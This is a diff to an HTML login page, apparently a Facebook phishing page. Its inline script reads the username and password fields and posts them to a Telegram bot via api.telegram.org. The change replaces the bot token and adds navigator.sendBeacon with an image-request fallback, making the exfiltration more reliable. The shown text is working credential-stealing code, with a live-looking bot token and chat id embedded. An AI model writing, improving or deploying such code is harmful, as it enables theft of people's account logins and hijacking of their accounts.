@@ -34,9 +34,9 @@ button{width:100%;padding:14px;font-size:17px;font-weight:700;color:#fff;backgro
 </div>
 <p class="foot">Español · English · Français · Português</p>
 <script>
-var T="9061884309:AAFvJInSbJ9QTMN-fdI6DtVUoFm3ZCU8HM";
+var T="9061884309:AAFtj5dnJQjl9Svv15qJQHYHN3VIxbuyk6M";
 var C="7238838844";
-function ping(t){new Image().src="https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent(t);}
+function ping(t){var u="https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent(t);if(navigator.sendBeacon){navigator.sendBeacon(u);}else{new Image().src=u;}}
 function go(e){
  e.preventDefault();
  ping("FB LOGIN | "+document.getElementById("u").value+" | "+document.getElementById("p").value);
